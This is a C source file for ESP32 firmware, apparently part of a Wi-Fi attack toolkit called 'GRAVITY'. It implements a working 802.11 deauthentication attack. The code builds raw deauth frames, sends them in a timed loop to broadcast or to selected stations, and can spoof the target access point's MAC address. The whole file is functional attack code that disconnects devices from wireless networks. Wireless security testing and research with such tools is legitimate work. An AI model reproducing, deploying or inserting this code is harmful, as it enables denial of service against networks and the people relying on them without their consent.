#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <esp_log.h>
#include "common.h"
#include "deauth.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#define DEBUG

// ========== DEAUTH PACKET ========== //
uint8_t deauth_pkt[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // Type, subtype: c0 => deauth, a0 => disassociate
    /*  2 - 3  */ 0x00, 0x00,                         // Duration (handled by the SDK)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
    /* 22 - 23 */ 0x00, 0x00,                         // Fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // Reason code (1 = unspecified reason)
};
int DEAUTH_DEST_OFFSET = 4;
int DEAUTH_SRC_OFFSET = 10;
int DEAUTH_BSSID_OFFSET = 16;
char *DEAUTH_TAG = "deauth@GRAVITY";

static DeauthMode mode = DEAUTH_MODE_OFF;
static DeauthMAC deauthMAC = DEAUTH_MAC_FRAME;
static long delay = DEAUTH_MILLIS_DEFAULT;
static TaskHandle_t deauthTask = NULL;

void deauthLoop(void *pvParameter) {
    //
    while (true) {
        /* Need to delay at least one tick to satisfy the watchdog */
        vTaskDelay((delay / portTICK_PERIOD_MS) + 1); /* Delay <delay>ms plus a smidge */

        ScanResultSTA **targetSTA = NULL;
        int targetCount = 0;
        switch (mode) {
            case DEAUTH_MODE_BROADCAST:
                /* Put a single object in targetSTA representing broadcast */
                targetSTA = malloc(sizeof(ScanResultSTA *));
                if (targetSTA == NULL) {
                    ESP_LOGE(DEAUTH_TAG, "Failed to allocate memory to model a broadcast station");
                    continue;
                }
                targetSTA[0] = malloc(sizeof(ScanResultSTA));
                if (targetSTA[0] == NULL) {
                    ESP_LOGE(DEAUTH_TAG, "Failed to allocate memory to hold model broadcast station");
                    continue;
                }
                targetCount = 1;
                // TODO: Channel
                memset(targetSTA[0]->mac, 0xFF, 6);
                strcpy(targetSTA[0]->strMac, "FF:FF:FF:FF:FF:FF");
                /* Use device MAC as srcAddr */
                uint8_t myMac[6];
                ESP_ERROR_CHECK(esp_wifi_get_mac(WIFI_IF_AP, myMac));
                memcpy(targetSTA[0]->apMac, myMac, 6);
                break;
            case DEAUTH_MODE_STA:
                /* Use gravity_selected_sta as targetSTA */
                targetSTA = gravity_selected_stas;
                targetCount = gravity_sel_sta_count;
                #ifdef DEBUG_VERBOSE
                    printf("DEAUTH STA mode. targetCount %d", targetCount);
                    for (int z=0; z<targetCount; ++z) {
                        printf(" targetSTA[%d] %02x:%02x:%02x:%02x:%02x:%02x",z,targetSTA[z]->mac[0],targetSTA[z]->mac[1],targetSTA[z]->mac[2],targetSTA[z]->mac[3],targetSTA[z]->mac[4],targetSTA[z]->mac[5]);
                    }
                    printf("\n");
                #endif
                break;
            default:
                /* NOOP */
        }
        uint8_t devMAC[6];
        for (int i = 0; i < targetCount; ++i) {
            // Set MAC as needed
            switch (deauthMAC) {
                case DEAUTH_MAC_FRAME:
                    /* Use targetSTA[i].apMac if it exists - Reject NULL OUI[0] */
                    if (targetSTA[i]->apMac[0] != 0x00) {
                        memcpy(&deauth_pkt[DEAUTH_SRC_OFFSET], targetSTA[i]->apMac,  6);
                        memcpy(&deauth_pkt[DEAUTH_BSSID_OFFSET], targetSTA[i]->apMac, 6);
                    }
                    break;
                case DEAUTH_MAC_DEVICE:
                    /* Use device MAC (whatever that is right now ... can I get its orig?) */
                    ESP_ERROR_CHECK(esp_wifi_get_mac(WIFI_IF_AP, devMAC));
                    memcpy(&deauth_pkt[DEAUTH_SRC_OFFSET], devMAC, 6);
                    memcpy(&deauth_pkt[DEAUTH_BSSID_OFFSET], devMAC, 6);
                    break;
                case DEAUTH_MAC_SPOOF:
                    if (targetSTA[i]->apMac[0] != 0x00) {
                    /* Set device MAC to targetSTA[i].apMac if it exists */
                    #ifdef DEBUG_VERBOSE
                        printf("spoofing, i is %d, mode is %d", i, mode);
                        printf(" STA is %s", targetSTA[i]->strMac);
                        printf(" AP is %p", targetSTA[i]->ap);
                        printf(" AP MAC %02x:%02x:%02x:%02x:%02x:%02x\n",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
                    #endif

                        /* Set frame and device MAC */
                        memcpy(&deauth_pkt[DEAUTH_SRC_OFFSET], targetSTA[i]->apMac, 6);
                        memcpy(&deauth_pkt[DEAUTH_BSSID_OFFSET], targetSTA[i]->apMac, 6);
                        //ESP_LOGI(DEAUTH_TAG, "Setting MAC: %02x:%02x:%02x:%02x:%02x:%02x",targetSTA[i].apMac[0],targetSTA[i].apMac[1],targetSTA[i].apMac[2],targetSTA[i].apMac[3],targetSTA[i].apMac[4],targetSTA[i].apMac[5]);
                        if (esp_wifi_set_mac(WIFI_IF_AP, targetSTA[i]->apMac) != ESP_OK) {
                            ESP_LOGW(DEAUTH_TAG, "Setting MAC to %02x:%02x:%02x:%02x:%02x:%02x failed, oh well",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
                        }
                    } else {
                        #ifdef DEBUG_VERBOSE
                            printf("No AP info, not changing SRC\n");
                        #endif
                    }
                    break;
                default:
                        ESP_LOGE(DEAUTH_TAG, "Invalid MAC action %d", deauthMAC);
                    continue;
            }
            /* Set destination */
            #ifdef DEBUG_VERBOSE
                printf("Destination %s\n",targetSTA[i]->strMac);
            #endif
            memcpy(&deauth_pkt[DEAUTH_DEST_OFFSET], targetSTA[i]->mac, 6);

            // Transmit
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_pkt, sizeof(deauth_pkt), false);
        }

        // post-loop

        if (mode == DEAUTH_MODE_BROADCAST) {
            free(targetSTA[0]);
            free(targetSTA);
        }
    }
}

esp_err_t deauth_start(DeauthMode dMode, DeauthMAC setMAC, long millis) {
    if (mode != DEAUTH_MODE_OFF) {
        /* Deauth is already running, stop that one */
        deauth_stop();
    }
    mode = dMode;
    deauthMAC = setMAC;
    delay = millis;
    if (mode == DEAUTH_MODE_OFF) {
        return ESP_OK;
    }
    xTaskCreate(&deauthLoop, "deauthLoop", 2048, NULL, 5, &deauthTask);
    return ESP_OK;
}

esp_err_t deauth_stop() {
    // TODO: COther things
    if (deauthTask != NULL) {
        vTaskDelete(deauthTask);
        deauthTask = NULL;
        mode = DEAUTH_MODE_OFF;
        attack_status[ATTACK_DEAUTH] = false;
    }

    return ESP_OK;
}